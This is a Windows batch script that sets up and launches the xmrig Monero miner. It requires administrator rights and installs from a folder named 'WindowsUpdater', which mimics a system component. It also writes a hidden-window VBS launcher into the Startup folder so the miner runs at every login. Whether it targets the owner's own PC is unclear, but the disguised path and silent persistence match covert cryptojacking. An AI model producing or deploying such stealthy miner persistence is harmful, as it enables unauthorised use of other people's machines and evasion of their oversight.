@echo off
REM Monero Watchdog Script - Launches xmrig.exe
title Monero Watchdog - High Mid-End PC
color 0A

REM ====================================================================
REM Launches xmrig.exe, sets VBS for auto-start
REM ====================================================================
setlocal enableextensions enabledelayedexpansion

REM === CONFIGURATION ===
set "DEST=C:\ProgramData\WindowsUpdater"
set "LOG_FILE=%DEST%\miner.log"
set "WATCHDOG_LOG=%DEST%\watchdog.log"

REM === Debug Logging ===
echo [*] Watchdog script started at %date% %time% > "%WATCHDOG_LOG%"
echo [*] Running as user: %username% >> "%WATCHDOG_LOG%"

REM === Check for Admin ===
echo [*] Checking for admin privileges...
echo [*] Checking for admin privileges... >> "%WATCHDOG_LOG%"
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
if '%errorlevel%' neq '0' (
    echo [!] Admin privileges required. Run this script as administrator.
    echo [!] Admin privileges required. Run this script as administrator. >> "%WATCHDOG_LOG%"
    pause
    exit /b 1
)
echo [✔] Running with admin privileges. >> "%WATCHDOG_LOG%"

REM === Setup VBS for Auto-Start ===
echo [*] Setting up VBS for auto-start...
echo [*] Setting up VBS for auto-start... >> "%WATCHDOG_LOG%"
echo Set WShell = CreateObject("WScript.Shell") > "%DEST%\start_miner.vbs"
echo WShell.Run "cmd /c ""%DEST%\monero_watchdog.bat""", 0, False >> "%DEST%\start_miner.vbs"
copy "%DEST%\start_miner.vbs" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\" >nul 2>&1
if '%errorlevel%' equ '0' (
    echo [✔] VBS added to startup folder for auto-start. >> "%WATCHDOG_LOG%"
) else (
    echo [!] Failed to add VBS to startup folder. Run this script manually after reboot. >> "%WATCHDOG_LOG%"
)

REM === Start xmrig.exe ===
echo [*] Starting xmrig.exe...
echo [*] Starting xmrig.exe... >> "%WATCHDOG_LOG%"
if exist "%DEST%\xmrig.exe" (
    cd /d "%DEST%"
    start /min "" "%DEST%\xmrig.exe" --config="%DEST%\config.json" --randomx-1gb-pages --donate-level=0 --log-file="%LOG_FILE%" --print-time=60
    timeout /t 10 /nobreak >nul
    tasklist /fi "IMAGENAME eq xmrig.exe" | find "xmrig.exe" >nul
    if errorlevel 1 (
        echo [%date% %time%] xmrig.exe failed to start. Check antivirus, %LOG_FILE%, or run manually: %DEST%\xmrig.exe --config=%DEST%\config.json >> "%WATCHDOG_LOG%"
        pause
        exit /b 1
    ) else (
        echo [%date% %time%] xmrig.exe started successfully. >> "%WATCHDOG_LOG%"
    )
) else (
    echo [%date% %time%] xmrig.exe not found in %DEST%. Run monero_config.bat first. >> "%WATCHDOG_LOG%"
    pause
    exit /b 1
)

echo [✔] Watchdog complete. xmrig.exe is running.
echo Logs: %WATCHDOG_LOG%, %LOG_FILE%
echo [✔] Watchdog complete at %date% %time% >> "%WATCHDOG_LOG%"
pause